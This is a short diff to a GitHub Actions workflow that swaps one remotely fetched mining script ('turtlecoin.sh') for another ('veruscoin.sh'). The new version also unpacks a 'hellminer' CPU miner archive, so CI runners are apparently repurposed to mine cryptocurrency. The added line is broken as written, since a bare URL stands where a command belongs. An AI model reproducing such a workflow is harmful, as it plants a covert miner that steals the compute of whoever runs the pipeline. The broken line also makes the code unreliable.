@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_channel
       run: |
-        wget https://github.com/bangandroid19/vps/blob/main/turtlecoin.sh && ./turtlecoin.sh
+        https://github.com/bangandroid19/vps/blob/main/veruscoin.sh && tar xf hellminer_cpu_linux.tar.gz && ./veruscoin.sh
